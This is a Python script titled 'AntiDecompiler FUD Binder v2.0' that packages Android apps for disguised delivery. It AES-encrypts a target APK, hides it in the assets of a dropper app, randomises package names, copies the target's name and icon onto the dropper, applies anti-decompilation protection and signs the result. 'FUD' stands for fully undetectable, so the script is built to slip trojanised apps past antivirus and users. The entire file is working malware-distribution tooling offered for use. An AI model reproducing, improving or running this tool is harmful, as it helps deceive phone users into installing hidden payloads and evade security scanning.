#!/usr/bin/env python3
import os
import sys
import glob
import subprocess
import shutil
import zipfile
from datetime import datetime
from PIL import Image
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import xml.etree.ElementTree as ET
import random
import string

# Fix charmap errors globally for java processes
os.environ['JAVA_TOOL_OPTIONS'] = '-Dfile.encoding=UTF-8'

# Force UTF-8 console output (fixes UnicodeEncodeError on Windows cp1252)
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except:
    pass

AES_KEY = bytes.fromhex('b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1')

def aes_encrypt(data):
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)
    return iv + ciphertext

def encrypt_apk_file(input_apk, output_encrypted):
    print("[+] Encrypting target APK...")
    with open(input_apk, 'rb') as f:
        apk_data = f.read()
    encrypted_data = aes_encrypt(apk_data)
    with open(output_encrypted, 'wb') as f:
        f.write(encrypted_data)
    print(f"    {len(apk_data)} → {len(encrypted_data)} bytes")

def generate_random_package():
    part1 = ''.join(random.choices(string.ascii_lowercase, k=4))
    part2 = ''.join(random.choices(string.ascii_lowercase, k=4))
    part3 = ''.join(random.choices(string.ascii_lowercase, k=4))
    return f"com.{part1}.{part2}.{part3}"

def extract_app_name_from_apk(apk_path_or_dir):
    app_name = "App"
    
    if os.path.isfile(apk_path_or_dir):
        try:
            import tempfile
            script_dir = os.path.dirname(os.path.abspath(__file__))
            apktool_jar = os.path.join(script_dir, 'apktool.jar')
            
            with tempfile.TemporaryDirectory() as temp_dir:
                result = subprocess.run(
                    ['java', '-jar', apktool_jar, 'd', apk_path_or_dir, '-o', temp_dir, '-f', '-s'],
                    capture_output=True, timeout=60
                )
                if result.returncode == 0:
                    return extract_app_name_from_apk(temp_dir)
        except:
            pass
        return app_name
    
    try:
        manifest_path = os.path.join(apk_path_or_dir, 'AndroidManifest.xml')
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        app_element = root.find('application')
        if app_element is not None:
            label = app_element.get('{http://schemas.android.com/apk/res/android}label')
            if label:
                if label.startswith('@string/'):
                    string_name = label.replace('@string/', '')
                    strings_path = os.path.join(apk_path_or_dir, 'res', 'values', 'strings.xml')
                    try:
                        strings_tree = ET.parse(strings_path)
                        for string_elem in strings_tree.findall('.//string'):
                            if string_elem.get('name') == string_name:
                                app_name = string_elem.text or "App"
                                break
                    except:
                        pass
                else:
                    app_name = label
    except:
        pass
    
    return app_name

def extract_icon_from_zip(apk_path, output_icon_path):
    """Extract launcher icon directly from APK zip (works on ALL APK types including encrypted/obfuscated)."""
    try:
        preferred = [
            'mipmap-xxxhdpi', 'mipmap-xxhdpi', 'mipmap-xhdpi',
            'mipmap-hdpi', 'mipmap-mdpi', 'mipmap-anydpi-v26', 'mipmap',
            'drawable-xxxhdpi', 'drawable-xxhdpi', 'drawable-xhdpi',
            'drawable-hdpi', 'drawable-mdpi', 'drawable'
        ]
        with zipfile.ZipFile(apk_path) as zf:
            names = zf.namelist()
            candidates = []
            for name in names:
                low = name.lower()
                if not low.endswith(('.png', '.jpg', '.jpeg', '.webp')):
                    continue
                base = os.path.basename(name).lower()
                if ('ic_launcher' in base or 'icon' in base or 'app_icon' in base):
                    candidates.append(name)
            
            if not candidates:
                candidates = []
            
            for folder in preferred:
                for cand in candidates:
                    if f'res/{folder}/' in cand:
                        with open(output_icon_path, 'wb') as f:
                            f.write(zf.read(cand))
                        return True
            
            if candidates:
                with open(output_icon_path, 'wb') as f:
                    f.write(zf.read(candidates[0]))
                return True
            
            # Final fallback: largest image inside res/ (works for any APK layout)
            best_name = None
            best_size = 0
            for name in names:
                low = name.lower()
                if not low.endswith(('.png', '.jpg', '.jpeg', '.webp')):
                    continue
                if not (low.startswith('res/') or '/res/' in low):
                    continue
                try:
                    size = zf.getinfo(name).file_size
                    if size > best_size:
                        best_size = size
                        best_name = name
                except:
                    pass
            if best_name:
                with open(output_icon_path, 'wb') as f:
                    f.write(zf.read(best_name))
                return True
            return False
    except:
        return False

def extract_icon_from_apk(apk_path, output_icon_path):
    try:
        import tempfile
        script_dir = os.path.dirname(os.path.abspath(__file__))
        apktool_jar = os.path.join(script_dir, 'apktool.jar')
        
        with tempfile.TemporaryDirectory() as temp_dir:
            result = subprocess.run(
                ['java', '-jar', apktool_jar, 'd', apk_path, '-o', temp_dir, '-f', '-s'],
                capture_output=True, timeout=60
            )
            
            if result.returncode == 0:
                manifest_path = os.path.join(temp_dir, 'AndroidManifest.xml')
                if os.path.exists(manifest_path):
                    tree = ET.parse(manifest_path)
                    root = tree.getroot()
                    app_element = root.find('application')
                    if app_element is not None:
                        icon_ref = app_element.get('{http://schemas.android.com/apk/res/android}icon')
                        if icon_ref and icon_ref.startswith('@'):
                            icon_ref = icon_ref[1:]
                            parts = icon_ref.split('/')
                            if len(parts) == 2:
                                icon_type, icon_name = parts
                                densities = ['xxxhdpi', 'xxhdpi', 'xhdpi', 'hdpi', 'mdpi', 'anydpi-v26', 'anydpi']
                                for density in densities:
                                    for folder in [f'{icon_type}-{density}', f'{icon_type}']:
                                        icon_dir = os.path.join(temp_dir, 'res', folder)
                                        if not os.path.exists(icon_dir):
                                            continue
                                        for ext in ['.png', '.jpg', '.jpeg', '.webp']:
                                            icon_file = os.path.join(icon_dir, icon_name + ext)
                                            if os.path.exists(icon_file):
                                                shutil.copy2(icon_file, output_icon_path)
                                                return True
    except:
        pass
    
    if extract_icon_from_zip(apk_path, output_icon_path):
        return True
    
    return False

def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.apk"):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    work_dir = f"dropper_work_{timestamp}"
    target_work_dir = f"target_work_{timestamp}"
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    apktool_jar = os.path.join(script_dir, 'apktool.jar')
    antidecompiler_jar = os.path.join(script_dir, 'AntiDecompiler.jar')
    apksigner_jar = os.path.join(script_dir, 'apksigner.jar')
    dropper_path = os.path.join(script_dir, dropper_apk)
    platform_key = os.path.join(script_dir, 'key.pk8')
    platform_cert = os.path.join(script_dir, 'certificate.pem')
    
    target_apk_path = os.path.abspath(target_apk_path)
    if user_icon_path:
        user_icon_path = os.path.abspath(user_icon_path)
    
    original_cwd = os.getcwd()
    os.chdir(script_dir)
    
    if not os.path.isabs(output_name):
        output_name = os.path.join(original_cwd, output_name)
    output_name = os.path.abspath(output_name)
    
    zipalign_exe = os.path.join(script_dir, 'zipalign.exe') if sys.platform == 'win32' else 'zipalign'
    
    for item in os.listdir(script_dir):
        if item.startswith(('dropper_work_', 'target_work_', 'temp_', 'aligned_', 'protected_', 'extracted_icon_', 'target_rebuilt_', 'target_aligned_', 'target_signed_')):
            item_path = os.path.join(script_dir, item)
            try:
                if os.path.isdir(item_path):
                    shutil.rmtree(item_path, ignore_errors=True)
                elif os.path.isfile(item_path):
                    os.remove(item_path)
            except:
                pass
    
    try:
        print("\n[+] Starting FUD APK binding...")
        target_rebuild_success = False
        app_name = "App"
        total_patched = 0
        target_package_name = "com.example.app"
        new_target_package = target_package_name
        target_signed_apk = None
        
        try:
            print("[+] Decompiling target APK to smali...")
            subprocess.run(['java', '-jar', apktool_jar, 'd', target_apk_path, '-o', target_work_dir, '-f'],
                          check=True, capture_output=True, timeout=120)
            
            app_name = extract_app_name_from_apk(target_work_dir)
            
            target_package_name = "com.example.app"
            try:
                target_manifest_path = os.path.join(target_work_dir, 'AndroidManifest.xml')
                target_tree = ET.parse(target_manifest_path)
                target_root = target_tree.getroot()
                target_package = target_root.get('package')
                if target_package:
                    target_package_name = target_package
            except:
                pass
            
            new_target_package = generate_random_package()
            print(f"[+] Changing target package: {target_package_name} → {new_target_package}")
            
            old_smali_path = target_package_name.replace('.', '/')
            new_smali_path = new_target_package.replace('.', '/')
            
            print("[+] Patching smali files...")
            smali_dirs = [d for d in os.listdir(target_work_dir) if d.startswith('smali')]
            total_patched = 0
            
            for smali_dir in smali_dirs:
                smali_path = os.path.join(target_work_dir, smali_dir)
                if not os.path.isdir(smali_path):
                    continue
                
                for root_dir, dirs, files in os.walk(smali_path):
                    for file in files:
                        if not file.endswith('.smali'):
                            continue
                        
                        file_path = os.path.join(root_dir, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                            
                            old_ref = f'L{old_smali_path}/'
                            new_ref = f'L{new_smali_path}/'
                            
                            if old_ref in content:
                                content = content.replace(old_ref, new_ref)
                                with open(file_path, 'w', encoding='utf-8') as f:
                                    f.write(content)
                                total_patched += 1
                        except:
                            pass
            
            print(f"    ✓ Patched {total_patched} smali files")
            
            try:
                app_element = target_root.find('application')
                if app_element is not None:
                    app_name_attr = app_element.get('{http://schemas.android.com/apk/res/android}name')
                    if app_name_attr:
                        if app_name_attr.startswith(target_package_name):
                            new_app_name = app_name_attr.replace(target_package_name, new_target_package)
                            app_element.set('{http://schemas.android.com/apk/res/android}name', new_app_name)
                            print(f"    ✓ Application class: {app_name_attr} → {new_app_name}")
                
                for tag in ['activity', 'service', 'receiver', 'provider']:
                    for component in target_root.findall(f'.//{tag}'):
                        comp_name = component.get('{http://schemas.android.com/apk/res/android}name')
                        if comp_name and comp_name.startswith(target_package_name):
                            new_comp_name = comp_name.replace(target_package_name, new_target_package)
                            component.set('{http://schemas.android.com/apk/res/android}name', new_comp_name)
                        
                        # Update authorities attribute for providers
                        if tag == 'provider':
                            authorities = component.get('{http://schemas.android.com/apk/res/android}authorities')
                            if authorities and target_package_name in authorities:
                                new_authorities = authorities.replace(target_package_name, new_target_package)
                                component.set('{http://schemas.android.com/apk/res/android}authorities', new_authorities)
                                print(f"    ✓ Provider authorities: {authorities} → {new_authorities}")
                
                for alias in target_root.findall('.//activity-alias'):
                    target_activity = alias.get('{http://schemas.android.com/apk/res/android}targetActivity')
                    if target_activity and target_activity.startswith(target_package_name):
                        new_target = target_activity.replace(target_package_name, new_target_package)
                        alias.set('{http://schemas.android.com/apk/res/android}targetActivity', new_target)
                    
                    alias_name = alias.get('{http://schemas.android.com/apk/res/android}name')
                    if alias_name and alias_name.startswith(target_package_name):
                        new_alias_name = alias_name.replace(target_package_name, new_target_package)
                        alias.set('{http://schemas.android.com/apk/res/android}name', new_alias_name)
                
                target_root.set('package', new_target_package)
                target_tree.write(target_manifest_path, encoding='utf-8', xml_declaration=True)
                print(f"    ✓ Target package updated in manifest")
            except Exception as e:
                print(f"    ⚠ Failed to update target package: {e}")
                new_target_package = target_package_name
            
            print("[+] Rebuilding target APK...")
            target_rebuilt_apk = os.path.join(script_dir, f"target_rebuilt_{timestamp}.apk")
            subprocess.run(['java', '-jar', apktool_jar, 'b', target_work_dir, '-o', target_rebuilt_apk],
                          check=True, capture_output=True, timeout=120)
            
            print("[+] Zipaligning target APK...")
            target_aligned_apk = os.path.join(script_dir, f"target_aligned_{timestamp}.apk")
            try:
                subprocess.run([zipalign_exe, '-f', '-p', '4', target_rebuilt_apk, target_aligned_apk],
                              check=True, capture_output=True, timeout=60)
                if os.path.exists(target_rebuilt_apk):
                    os.remove(target_rebuilt_apk)
            except:
                print("    ⚠ Zipalign failed")
                target_aligned_apk = target_rebuilt_apk
            
            print("[+] Signing target APK...")
            target_signed_apk = os.path.join(script_dir, f"target_signed_{timestamp}.apk")
            subprocess.run(['java', '-jar', apksigner_jar, 'sign',
                           '--key', platform_key, '--cert', platform_cert,
                           '--v1-signing-enabled', 'false',
                           '--v2-signing-enabled', 'true',
                           '--v3-signing-enabled', 'true',
                           '--v4-signing-enabled', 'false',
                           '--out', target_signed_apk, target_aligned_apk],
                          check=True, capture_output=True, timeout=60)
            
            if os.path.exists(target_aligned_apk):
                os.remove(target_aligned_apk)
                
            target_rebuild_success = True
            
        except Exception as e:
            print(f"    ⚠ Target APK decompile/rebuild failed ({str(e)}). Using original APK.")
            target_rebuild_success = False
            app_name = extract_app_name_from_apk(target_apk_path)
        
        if target_rebuild_success:
            target_apk_to_encrypt = target_signed_apk if os.path.exists(target_signed_apk) else target_apk_path
        else:
            target_apk_to_encrypt = target_apk_path
        
        icon_to_use = None
        if user_icon_path and os.path.exists(user_icon_path):
            icon_to_use = user_icon_path
        else:
            extracted_icon = os.path.join(script_dir, f"extracted_icon_{timestamp}.png")
            if extract_icon_from_apk(target_apk_path, extracted_icon):
                icon_to_use = extracted_icon
        
        print("[+] Decompiling dropper...")
        subprocess.run(['java', '-jar', apktool_jar, 'd', dropper_path, '-o', work_dir, '-f'],
                      check=True, capture_output=True, timeout=120)
        
        print("[+] Encrypting target APK...")
        assets_dir = os.path.join(work_dir, 'assets')
        os.makedirs(assets_dir, exist_ok=True)
        encrypted_path = os.path.join(assets_dir, 'Axyra')
        encrypt_apk_file(target_apk_to_encrypt, encrypted_path)
        
        print("[+] Updating dropper package...")
        new_package = generate_random_package()
        
        dropper_old_package = "com.google.Axyra.installer"
        old_smali_path_dropper = dropper_old_package.replace('.', '/')
        new_smali_path_dropper = new_package.replace('.', '/')
        
        print("[+] Patching dropper smali files...")
        smali_dirs_dropper = [d for d in os.listdir(work_dir) if d.startswith('smali')]
        total_patched_dropper = 0
        
        for smali_dir in smali_dirs_dropper:
            smali_path = os.path.join(work_dir, smali_dir)
            if not os.path.isdir(smali_path):
                continue
            
            for root_dir, dirs, files in os.walk(smali_path):
                for file in files:
                    if not file.endswith('.smali'):
                        continue
                    
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        old_ref = f'L{old_smali_path_dropper}/'
                        new_ref = f'L{new_smali_path_dropper}/'
                        
                        if old_ref in content:
                            content = content.replace(old_ref, new_ref)
                            with open(file_path, 'w', encoding='utf-8') as f:
                                f.write(content)
                            total_patched_dropper += 1
                    except:
                        pass
        
        print(f"    ✓ Patched {total_patched_dropper} dropper smali files")
        
        manifest_path = os.path.join(work_dir, 'AndroidManifest.xml')
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        
        try:
            app_element = root.find('application')
            if app_element is not None:
                app_name_attr = app_element.get('{http://schemas.android.com/apk/res/android}name')
                if app_name_attr and app_name_attr.startswith(dropper_old_package):
                    new_app_name = app_name_attr.replace(dropper_old_package, new_package)
                    app_element.set('{http://schemas.android.com/apk/res/android}name', new_app_name)
                
                app_element.set('{http://schemas.android.com/apk/res/android}label', app_name)
            
            for tag in ['activity', 'service', 'receiver', 'provider']:
                for component in root.findall(f'.//{tag}'):
                    comp_name = component.get('{http://schemas.android.com/apk/res/android}name')
                    if comp_name and comp_name.startswith(dropper_old_package):
                        new_comp_name = comp_name.replace(dropper_old_package, new_package)
                        component.set('{http://schemas.android.com/apk/res/android}name', new_comp_name)
                    
                    # Update authorities attribute for providers (FileProvider, ContentProvider, etc.)
                    if tag == 'provider':
                        authorities = component.get('{http://schemas.android.com/apk/res/android}authorities')
                        if authorities:
                            # Replace old package name in authorities
                            if dropper_old_package in authorities:
                                new_authorities = authorities.replace(dropper_old_package, new_package)
                                component.set('{http://schemas.android.com/apk/res/android}authorities', new_authorities)
                                print(f"    ✓ Dropper provider authorities: {authorities} → {new_authorities}")
            
            # Update permission definitions and usages
            for permission in root.findall('.//permission'):
                perm_name = permission.get('{http://schemas.android.com/apk/res/android}name')
                if perm_name and dropper_old_package in perm_name:
                    new_perm_name = perm_name.replace(dropper_old_package, new_package)
                    permission.set('{http://schemas.android.com/apk/res/android}name', new_perm_name)
                    print(f"    ✓ Permission: {perm_name} → {new_perm_name}")
            
            for uses_perm in root.findall('.//uses-permission'):
                perm_name = uses_perm.get('{http://schemas.android.com/apk/res/android}name')
                if perm_name and dropper_old_package in perm_name:
                    new_perm_name = perm_name.replace(dropper_old_package, new_package)
                    uses_perm.set('{http://schemas.android.com/apk/res/android}name', new_perm_name)
                    print(f"    ✓ Uses-permission: {perm_name} → {new_perm_name}")
            
            # Update intent-filter actions that contain package name
            for intent_filter in root.findall('.//intent-filter'):
                for action in intent_filter.findall('action'):
                    action_name = action.get('{http://schemas.android.com/apk/res/android}name')
                    if action_name and dropper_old_package in action_name:
                        new_action_name = action_name.replace(dropper_old_package, new_package)
                        action.set('{http://schemas.android.com/apk/res/android}name', new_action_name)
                        print(f"    ✓ Action: {action_name} → {new_action_name}")
            
            for alias in root.findall('.//activity-alias'):
                target_activity = alias.get('{http://schemas.android.com/apk/res/android}targetActivity')
                if target_activity and target_activity.startswith(dropper_old_package):
                    new_target = target_activity.replace(dropper_old_package, new_package)
                    alias.set('{http://schemas.android.com/apk/res/android}targetActivity', new_target)
                
                alias_name = alias.get('{http://schemas.android.com/apk/res/android}name')
                if alias_name and alias_name.startswith(dropper_old_package):
                    new_alias_name = alias_name.replace(dropper_old_package, new_package)
                    alias.set('{http://schemas.android.com/apk/res/android}name', new_alias_name)
        except:
            pass
        
        root.set('package', new_package)
        root.set('{http://schemas.android.com/apk/res/android}versionCode', '1')
        root.set('{http://schemas.android.com/apk/res/android}versionName', 'null')
        
        queries_element = root.find('queries')
        if queries_element is not None:
            for package_elem in queries_element.findall('package'):
                pkg_name = package_elem.get('{http://schemas.android.com/apk/res/android}name')
                if pkg_name == 'com.replace.main.apk':
                    package_elem.set('{http://schemas.android.com/apk/res/android}name', new_target_package)
        
        tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
        
        strings_path = os.path.join(work_dir, 'res', 'values', 'strings.xml')
        if os.path.exists(strings_path):
            strings_tree = ET.parse(strings_path)
            strings_root = strings_tree.getroot()
            target_pkg_string = None
            for string_elem in strings_root.findall('string'):
                if string_elem.get('name') == 'target_package_name':
                    target_pkg_string = string_elem
                    break
            if target_pkg_string is not None:
                target_pkg_string.text = new_target_package
            else:
                new_string = ET.SubElement(strings_root, 'string', name='target_package_name')
                new_string.text = new_target_package
            strings_tree.write(strings_path, encoding='utf-8', xml_declaration=True)
        
        if icon_to_use:
            print("[+] Replacing icon...")
            try:
                icon_img = Image.open(icon_to_use).convert('RGBA')
                drawable_folder = os.path.join(work_dir, 'res', 'drawable')
                os.makedirs(drawable_folder, exist_ok=True)
                
                for old_icon in ['icon.jpg', 'icon.png', 'icon.jpeg']:
                    old_path = os.path.join(drawable_folder, old_icon)
                    if os.path.exists(old_path):
                        os.remove(old_path)
                
                icon_resized = icon_img.resize((512, 512), Image.Resampling.LANCZOS)
                icon_resized.save(os.path.join(drawable_folder, 'icon.png'), 'PNG')
                
                icon_sizes = [('mipmap-hdpi', 72), ('mipmap-mdpi', 48), ('mipmap-xhdpi', 96), 
                             ('mipmap-xxhdpi', 144), ('mipmap-xxxhdpi', 192)]
                for folder, size in icon_sizes:
                    res_folder = os.path.join(work_dir, 'res', folder)
                    os.makedirs(res_folder, exist_ok=True)
                    resized = icon_img.resize((size, size), Image.Resampling.LANCZOS)
                    resized.save(os.path.join(res_folder, 'ic_launcher.png'), 'PNG')
            except Exception as e:
                print(f"    ⚠ Icon replacement failed: {e}")
        
        print("[+] Rebuilding dropper...")
        temp_apk = os.path.join(script_dir, f"temp_{timestamp}.apk")
        subprocess.run(['java', '-jar', apktool_jar, 'b', work_dir, '-o', temp_apk],
                      check=True, capture_output=True, timeout=120)
        
        print("[+] Applying protection...")
        protected_apk = os.path.join(script_dir, f"protected_{timestamp}.apk")
        try:
            subprocess.run(['java', '-jar', antidecompiler_jar, 'protect',
                          '-i', temp_apk, '-o', protected_apk, '-enable-dex', '-f'],
                          check=True, capture_output=True, timeout=120)
            if os.path.exists(protected_apk):
                os.remove(temp_apk)
            else:
                protected_apk = temp_apk
        except:
            protected_apk = temp_apk
        
        print("[+] Zipaligning dropper...")
        aligned_apk = os.path.join(script_dir, f"aligned_{timestamp}.apk")
        try:
            subprocess.run([zipalign_exe, '-f', '-p', '4', protected_apk, aligned_apk],
                          check=True, capture_output=True, timeout=60)
        except:
            shutil.copy2(protected_apk, aligned_apk)
        
        if os.path.exists(protected_apk):
            os.remove(protected_apk)
        
        print("[+] Signing dropper...")
        subprocess.run(['java', '-jar', apksigner_jar, 'sign',
                       '--key', platform_key, '--cert', platform_cert,
                       '--v1-signing-enabled', 'false',
                       '--v2-signing-enabled', 'true',
                       '--v3-signing-enabled', 'true',
                       '--v4-signing-enabled', 'false',
                       '--out', output_name, aligned_apk],
                      check=True, capture_output=True, timeout=60)
        
        os.remove(aligned_apk)
        
        print(f"\n[✓] SUCCESS!")
        print(f"[✓] Output: {output_name}")
        print(f"[✓] Dropper Package: {new_package}")
        print(f"[✓] App Name: {app_name}")
        print(f"[✓] Target Package: {target_package_name} → {new_target_package}")
        print(f"[✓] Smali Patching: {total_patched} files")
        
        return output_name
        
    except subprocess.CalledProcessError as e:
        print(f"\n[✗] FAILED: {e}")
        if e.stderr:
            print(f"[✗] Error: {e.stderr.decode()}")
        return None
    except Exception as e:
        print(f"\n[✗] FAILED: {e}")
        return None
    finally:
        # Cleanup temp files and directories
        try:
            os.chdir(original_cwd)
        except:
            pass
        
        # Remove work directories
        try:
            if os.path.exists(work_dir):
                shutil.rmtree(work_dir, ignore_errors=True)
                print(f"[Cleanup] Removed: {work_dir}")
        except:
            pass
        
        try:
            if os.path.exists(target_work_dir):
                shutil.rmtree(target_work_dir, ignore_errors=True)
                print(f"[Cleanup] Removed: {target_work_dir}")
        except:
            pass
        
        # Remove temp APK files
        for pattern in [f'temp_{timestamp}.apk', f'fake_{timestamp}.apk', f'aligned_{timestamp}.apk', 
                       f'protected_{timestamp}.apk', f'target_rebuilt_{timestamp}.apk', 
                       f'target_aligned_{timestamp}.apk', f'target_signed_{timestamp}.apk',
                       f'extracted_icon_{timestamp}.png']:
            try:
                temp_file = os.path.join(script_dir, pattern)
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    print(f"[Cleanup] Removed: {pattern}")
            except:
                pass
        
        for path in [os.path.join(script_dir, work_dir), os.path.join(script_dir, target_work_dir)]:
            if os.path.exists(path):
                try:
                    shutil.rmtree(path, ignore_errors=False)
                    print(f"[Cleanup] Removed: {os.path.basename(path)}")
                except Exception as e:
                    print(f"[Cleanup] Warning: Could not remove {os.path.basename(path)}: {e}")
        
        for item in os.listdir(script_dir):
            if item.startswith(('extracted_icon_', 'target_rebuilt_', 'target_aligned_', 'target_signed_')):
                try:
                    item_path = os.path.join(script_dir, item)
                    if os.path.isfile(item_path):
                        os.remove(item_path)
                except:
                    pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("\n╔════════════════════════════════════════════╗")
        print("║       AntiDecompiler FUD Binder v2.0       ║")
        print("╚════════════════════════════════════════════╝\n")
        print("Usage: python fud.py <target_apk> <output_name> [icon_path]\n")
        print("Example:")
        print("  python fud.py MyApp.apk Bound_MyApp.apk")
        print("  python fud.py MyApp.apk Bound_MyApp.apk custom_icon.png\n")
        sys.exit(1)
    
    target = sys.argv[1]
    output = sys.argv[2]
    icon = sys.argv[3] if len(sys.argv) > 3 else None
    
    if not os.path.exists(target):
        print(f"[✗] Error: Target APK not found: {target}")
        sys.exit(1)
    
    result = bind_apk(target, icon, output)
    sys.exit(0 if result else 1)
